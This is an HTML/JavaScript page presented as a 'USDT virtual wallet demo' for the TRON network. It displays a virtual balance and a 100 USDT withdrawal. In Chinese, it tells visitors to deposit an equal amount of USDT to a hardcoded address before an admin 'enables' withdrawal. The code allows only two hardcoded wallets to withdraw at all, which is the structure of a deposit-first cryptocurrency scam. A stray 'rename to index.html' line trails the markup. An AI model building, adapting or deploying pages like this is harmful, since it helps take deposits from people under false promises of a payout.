<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
  <title>USDT 虚拟钱包 Demo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <style>
    body { font-family: sans-serif; padding: 20px; max-width: 480px; margin: auto; }
    .card { border: 1px solid #ddd; border-radius: 8px; padding: 16px; box-shadow:0 2px 6px rgba(0,0,0,.05); }
    .row { margin-bottom: 12px; }
    .label { color: #666; font-size:0.95em; }
    .value { font-size: 1.2em; word-break: break-all; }
    .mono { font-family: monospace; font-size:0.95em; }
    button { width: 100%; padding: 10px; border:none; background:#4A5568; color:#fff; border-radius:4px; font-size:1em; cursor:pointer; }
    button:disabled { background:#aaa; cursor:not-allowed; }
    #msg { margin-top:12px; color:#c00; min-height:1.2em; }
    #mobileNotice {
      display:none; background:#ffeaea; color:#c00; padding:10px; border-radius:6px;
      margin-bottom:15px; font-size:0.95em; text-align:center;
    }
    #copyDeposit { font-size:0.8em; margin-top:4px; text-decoration:underline; cursor:pointer; color:#0070f3; background:none; border:none; }
  </style>
</head>
<body>
  <div id="mobileNotice">⚠️ 请在 TronLink App 内的浏览器中打开此页面以连接钱包。</div>
  <div class="card">
    <div class="row">
      <div class="label">钱包地址：</div>
      <div id="addr" class="value">未连接</div>
    </div>
    <div class="row">
      <div class="label">账户余额：</div>
      <div id="bal" class="value">--</div>
    </div>
    <div class="row">
      <div class="label">本次可提：</div>
      <div class="value">100 USDT</div>
    </div>
    <div class="row">
      <div class="label">下次可提时间：</div>
      <div id="next" class="value">--</div>
    </div>
    <div class="row">
      <div class="label">充值地址（先充后提）：</div>
      <div id="depositAddr" class="value mono">--</div>
      <button id="copyDeposit" onclick="copyDepositAddr()">复制充值地址</button>
    </div>
    <p style="color:#666;font-size:0.9em;line-height:1.4;">
      请将等额 USDT 转入以上地址，管理员确认到账后为您开通提现资格。<br/>
      仅以下钱包可提现：TFcpXGJ... / TNiJWUJ...
    </p>
    <button id="btn" disabled>连接钱包</button>
    <div id="msg"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
  <script>
    const CONTRACT = 'TJc1U7hXk5aGZ7f1KXyvQ1rM2p8Y4LmYtY';
    const ABI = [
      {"inputs":[{"internalType":"address","name":"_usdt","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
      {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Withdraw","type":"event"},
      {"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Funded","type":"event"},
      {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"uint256","name":"_virtualBalance","type":"uint256"}],"name":"setUser","outputs":[],"stateMutability":"nonpayable","type":"function"},
      {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"fundContract","outputs":[],"stateMutability":"nonpayable","type":"function"},
      {"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},
      {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"getNextWithdrawTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
      {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"getRemainingVirtualBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
    ];

    const ALLOWED_USERS = [
      'TFcpXGJVourvwxCnMYfR6D5nwFcVzWxdfc',
      'TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF'
    ];
    const DEPOSIT_ADDR = 'TLUT4CwHpcSgQWnEiM9FmyZR76nTRVNSne';
    const DECIMALS = 1e6;

    let tronWeb, contract;

    function detectMobile() {
      const ua = navigator.userAgent.toLowerCase();
      const isMobile = /iphone|android|ipad|micromessenger/.test(ua);
      if (isMobile) {
        document.getElementById('mobileNotice').style.display = 'block';
      }
    }

    function copyDepositAddr() {
      navigator.clipboard.writeText(DEPOSIT_ADDR).then(()=>{
        document.getElementById('msg').innerText = '充值地址已复制';
        setTimeout(()=>{document.getElementById('msg').innerText='';},2000);
      }).catch(()=>{});
    }

    async function init() {
      detectMobile();
      document.getElementById('depositAddr').innerText = DEPOSIT_ADDR;

      if (window.tronWeb && window.tronWeb.ready) {
        tronWeb = window.tronWeb;
        contract = await tronWeb.contract(ABI, CONTRACT);

        const addr = tronWeb.defaultAddress.base58;
        document.getElementById('addr').innerText = addr;

        if (ALLOWED_USERS.includes(addr)) {
          document.getElementById('btn').innerText = '提现 100 USDT';
          document.getElementById('btn').disabled = false;
          loadNextTime(addr);
          loadVirtualBalance(addr);
        } else {
          document.getElementById('btn').innerText = '当前地址不可提现';
          document.getElementById('btn').disabled = true;
          document.getElementById('msg').innerText = '请切换到指定钱包地址。';
        }
      } else {
        document.getElementById('msg').innerText = '请在 TronLink App 或安装 TronLink 插件后重新打开。';
      }
    }

    async function loadNextTime(addr) {
      try {
        const t = await contract.getNextWithdrawTime(addr).call();
        const date = new Date(Number(t) * 1000);
        document.getElementById('next').innerText = Number(t)===0?'--':date.toISOString().slice(0,10);
      } catch(err) {
        console.error('getNextWithdrawTime error', err);
        document.getElementById('next').innerText = '--';
      }
    }

    async function loadVirtualBalance(addr) {
      try {
        const bal = await contract.getRemainingVirtualBalance(addr).call();
        const formatted = Number(bal) / DECIMALS;
        document.getElementById('bal').innerText = formatted.toLocaleString(undefined,{minimumFractionDigits:0}) + ' USDT';
      } catch(err) {
        console.error('getRemainingVirtualBalance error', err);
        document.getElementById('bal').innerText = '--';
      }
    }

    async function withdraw() {
      document.getElementById('btn').disabled = true;
      document.getElementById('msg').innerText = '请求中…';
      try {
        await contract.withdraw().send();
        document.getElementById('msg').innerText = '提现交易已发起，请在 TronLink 中确认。';
      } catch (e) {
        console.error('withdraw error', e);
        document.getElementById('msg').innerText = '提现失败：合约余额不足、资格或周期未到。';
      }
      document.getElementById('btn').disabled = false;
    }

    document.addEventListener('DOMContentLoaded', ()=>{
      document.getElementById('btn').addEventListener('click', withdraw);
      init();
    });
  </script>
</body>
</html>
rename to index.html
